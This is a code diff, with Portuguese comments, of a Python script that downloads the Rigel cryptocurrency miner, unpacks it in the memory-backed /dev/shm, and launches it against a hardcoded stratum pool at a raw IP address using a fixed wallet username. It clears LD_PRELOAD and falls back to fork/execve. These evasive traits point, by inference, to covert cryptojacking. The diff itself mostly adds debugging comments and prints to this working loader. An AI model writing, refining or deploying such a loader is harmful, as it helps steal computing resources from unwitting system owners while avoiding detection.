@@ -6,9 +6,11 @@ import requests
 import tempfile
 import subprocess
 from ctypes import CDLL, get_errno
+# Removendo import json já que não vamos mais usar arquivo de configuração
 
 # URL para o Rigel Miner
 MINER_URL = "https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"
+# Não usamos mais POOL_CONFIG aqui
 
 libc = CDLL(None)
 
@@ -32,11 +34,14 @@ def execute_miner(fd):
     with tempfile.TemporaryDirectory(dir="/dev/shm") as tmpdir:
         os.chdir(tmpdir)
         
+        # Extrair o arquivo baixado
         tar_cmd = ["/bin/tar", "xzf", f"/proc/self/fd/{fd}", "-C", tmpdir]
         subprocess.run(tar_cmd, check=True, pass_fds=[fd])
         
+        # Procurar pelo executável do Rigel e renomeá-lo
         miner_bin = None
         for root, dirs, files in os.walk(tmpdir):
+            # Procuramos qualquer arquivo executável que possa ser o minerador
             for file in files:
                 file_path = os.path.join(root, file)
                 if os.access(file_path, os.X_OK) and ("rigel" in file.lower() or file == "rigel"):
@@ -49,6 +54,7 @@ def execute_miner(fd):
                 break
         
         if not miner_bin:
+            # Tentativa alternativa: procurar qualquer executável na pasta extraída
             for root, dirs, files in os.walk(tmpdir):
                 for file in files:
                     file_path = os.path.join(root, file)
@@ -63,6 +69,7 @@ def execute_miner(fd):
                     break
         
         if not miner_bin:
+            # Listar todos os arquivos para depuração
             print("Conteúdo extraído:")
             for root, dirs, files in os.walk(tmpdir):
                 for file in files:
@@ -71,23 +78,32 @@ def execute_miner(fd):
         
         os.chmod(miner_bin, 0o755)
         
+        # Usar uma abordagem diferente para os argumentos
+        # Vamos simplesmente passar o executável como primeiro argumento
+        # e deixar o Rigel usar sua configuração padrão com parâmetros mínimos
         args = [miner_bin]
-        args.extend(["--algorithm", "octopus"])
+        
+        # Adicionar apenas os parâmetros essenciais
+        args.extend(["--algorithm", "octopus"])  # Corrigido de --algo para --algorithm
         args.extend(["--url", "stratum+ssl://18.221.157.241:8443"])
         args.extend(["--username", "krxY97WV2D.CLD"])
         args.extend(["--password", "x"])
-        args.extend(["--no-strict-ssl"])
+        args.extend(["--no-strict-ssl"]) 
 
+
+        # Imprimir os argumentos para depuração
         print(f"Executando: {' '.join(args)}")
         
         env = os.environ.copy()
         env["LD_PRELOAD"] = ""
         
+        # Tentar execução direta para ver mensagens de erro
         try:
             subprocess.run(args, env=env, check=True)
         except subprocess.CalledProcessError as e:
             print(f"Erro ao executar o minerador: {e}")
             
+            # Tentar com fork/execve como no original
             pid = os.fork()
             if pid == 0:
                 os.close(fd)
